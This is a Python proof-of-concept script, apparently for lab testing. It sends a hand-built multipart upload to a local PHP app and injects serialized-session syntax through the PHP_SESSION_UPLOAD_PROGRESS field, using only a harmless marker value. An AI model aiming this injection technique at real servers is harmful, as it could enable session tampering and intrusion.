#!/usr/bin/env python3
import socket, sys
HOST='127.0.0.1'; PORT=8088; BND=b'B'*10
KEY=b'X|E:20:"AAAAAAAAAAAAAAAAAAAA";'
parts=[]
parts.append(('PHPSESSID', b'injtest0001', None))
parts.append(('PHP_SESSION_UPLOAD_PROGRESS', KEY, None))
parts.append(('f', b'hello-upload-data'*4, ('a.txt','text/plain')))
o=bytearray()
for name,data,fn in parts:
    o+=b'--'+BND+b'\r\nContent-Disposition: form-data; name="'+name.encode()+b'"'
    if fn:
        o+=b'; filename="'+fn[0].encode()+b'"\r\nContent-Type: '+fn[1].encode()+b'\r\n\r\n'
    else:
        o+=b'\r\n\r\n'
    o+=data+b'\r\n'
o+=b'--'+BND+b'--\r\n'; body=bytes(o)
h=(f'POST /index.php HTTP/1.1\r\nHost: {HOST}:{PORT}\r\nContent-Type: multipart/form-data; boundary={BND.decode()}\r\nContent-Length: {len(body)}\r\nConnection: close\r\n\r\n').encode()
s=socket.create_connection((HOST,PORT),timeout=20); s.settimeout(20)
s.sendall(h+body)
resp=b''
try:
    while True:
        d=s.recv(65536)
        if not d: break
        resp+=d
except OSError: pass
s.close()
print(resp[:4000].decode('latin1','replace'))
